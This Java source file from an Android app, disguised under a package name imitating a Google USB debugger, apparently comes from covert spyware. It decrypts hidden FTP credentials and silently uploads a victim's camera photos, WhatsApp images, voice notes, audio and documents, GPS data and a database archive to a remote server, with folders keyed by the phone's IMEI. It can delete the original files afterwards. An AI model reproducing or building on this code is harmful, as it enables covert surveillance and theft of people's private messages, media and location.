package com.google.android.usbdebugger;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FTP_Sender {

    private static final String TAG = "FTP_Sender";

    public static void FTP(final File file, final String[] SelFiles, final int type, final int delete,
                           final int Sent, final ArrayList<String> conf, final boolean screenstastus,
                           final String imeiNumber1, final Context context, final int recordCount, final File aDir) {

        if (!hasConnection(context, 0, conf)) {
            return;
        }

        new Thread(() -> {
            FTPClient ftp = new FTPClient();
            try {
                Log.d(TAG, "Начало сеанса FTP. Тип: " + type);

                if (conf == null || conf.size() < 7) {
                     Log.e(TAG, "Конфигурация FTP неполная. Отправка невозможна.");
                     return;
                }

                String ftpIp = EncryptDecryptStringWithAES.decrypt(conf.get(2));
                String ftpPortStr = conf.get(3);

                // ИСПРАВЛЕНО: Добавлена надежная проверка на пустые строки перед parseInt
                if (ftpIp == null || ftpIp.isEmpty() || ftpPortStr == null || ftpPortStr.isEmpty()) {
                    Log.e(TAG, "IP или порт FTP не указаны. Отправка невозможна.");
                    return;
                }
                int ftpPort = Integer.parseInt(ftpPortStr);

                String ftpUser = EncryptDecryptStringWithAES.decrypt(conf.get(5));
                String ftpPass = EncryptDecryptStringWithAES.decrypt(conf.get(6));
                String ftpFolder = EncryptDecryptStringWithAES.decrypt(conf.get(4));

                ftp.connect(InetAddress.getByName(ftpIp), ftpPort);

                if (FTPReply.isPositiveCompletion(ftp.getReplyCode())) {
                    if (ftp.login(ftpUser, ftpPass)) {
                        ftp.enterLocalPassiveMode();
                        ftp.setFileType(FTP.BINARY_FILE_TYPE);

                        String subDir = getSubTypeDirectory(type);
                        String finalRemotePath = imeiNumber1 + "/" + (ftpFolder == null || ftpFolder.isEmpty() ? "" : ftpFolder + "/") + subDir;
                        
                        if (!ftp.changeWorkingDirectory(finalRemotePath)) {
                            makeDirectories(ftp, finalRemotePath);
                        }

                        handleFileUpload(ftp, (type == 10) ? new String[]{file.getAbsolutePath()} : SelFiles, type, delete, Sent, context, imeiNumber1);

                        ftp.logout();
                    } else {
                        Log.e(TAG, "Не удалось войти на FTP-сервер.");
                    }
                } else {
                     Log.e(TAG, "Не удалось установить соединение с FTP-сервером. Код ответа: " + ftp.getReplyCode());
                }
                ftp.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Критическая ошибка в потоке FTP, тип=" + type, e);
            } finally {
                try {
                    if (ftp.isConnected()) {
                        ftp.disconnect();
                    }
                } catch (IOException e) {
                    Log.e(TAG, "Ошибка при закрытии ресурсов FTP", e);
                }
            }
        }).start();
    }

    private static void handleFileUpload(FTPClient ftp, String[] files, int type, int delete, int sent, Context context, String imei) throws IOException {
        DBHelper dbh = new DBHelper(context);

        if (type == 10) { 
            File dbFile = new File(files[0]);
            if (!dbFile.exists()) return;

            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
            String zipFileName = imei + "_" + sdf.format(new Date()) + ".zip";
            File zipFile = new File(context.getCacheDir(), zipFileName);

            try (FileOutputStream fos = new FileOutputStream(zipFile);
                 ZipOutputStream zos = new ZipOutputStream(fos);
                 FileInputStream fisDb = new FileInputStream(dbFile)) {
                zos.putNextEntry(new ZipEntry(dbFile.getName()));
                byte[] buffer = new byte[1024];
                int length;
                while ((length = fisDb.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
                zos.closeEntry();
            }

            try (FileInputStream fisZip = new FileInputStream(zipFile)) {
                if (ftp.storeFile(zipFile.getName(), fisZip)) {
                    Log.d(TAG, "Архив базы данных успешно отправлен: " + zipFile.getName());
                }
            } finally {
                zipFile.delete();
            }
        } else { 
            for (String filePath : files) {
                File fileToSend = new File(filePath);
                if (fileToSend.exists()) {
                    try (FileInputStream fis = new FileInputStream(fileToSend)) {
                        String remoteFileName = fileToSend.getName();
                        if (ftp.storeFile(remoteFileName, fis)) {
                            Log.d(TAG, "Файл " + remoteFileName + " успешно отправлен.");
                            
                            if (type != 1) { 
                                try (SQLiteDatabase db = dbh.getWritableDatabase()) {
                                    dbh.insert_SrFiles(db, "SrFiles", remoteFileName, new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.US).format(new Date()), String.valueOf(type), String.valueOf(sent));
                                }
                            }

                            if (delete == 1) {
                                fileToSend.delete();
                            }
                        } else {
                            Log.e(TAG, "Не удалось отправить файл " + remoteFileName);
                        }
                    }
                }
            }
        }
    }

    private static String getSubTypeDirectory(int type) {
        switch (type) {
            case 1: return "V";
            case 2: return "DCIM";
            case 3: return "WhatsApp/Images";
            case 4: return "WhatsApp/Audio";
            case 5: return "WhatsApp/Voice";
            case 6: return "WhatsApp/Docs";
            case 7: return "GPS";
            case 10: return "DB";
            default: return "Other";
        }
    }

    private static void makeDirectories(FTPClient ftp, String dirPath) throws IOException {
        String[] pathElements = dirPath.split("/");
        if (pathElements != null) {
            for (String singleDir : pathElements) {
                if (!singleDir.isEmpty()) {
                    if (!ftp.changeWorkingDirectory(singleDir)) {
                        if (!ftp.makeDirectory(singleDir)) {
                            throw new IOException("Не удалось создать директорию: " + singleDir);
                        }
                        if (!ftp.changeWorkingDirectory(singleDir)) {
                            throw new IOException("Не удалось перейти в директорию после создания: " + singleDir);
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public static boolean hasConnection(final Context context, final int type, final ArrayList<String> conf) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null || conf == null || conf.isEmpty()) return false;

        NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiInfo != null && wifiInfo.isConnected()) {
            return true;
        }

        if (conf.size() > 15 && "1".equals(conf.get(15))) {
            NetworkInfo mobileInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (mobileInfo != null && mobileInfo.isConnected()) {
                return true;
            }
        }

        return false;
    }
}
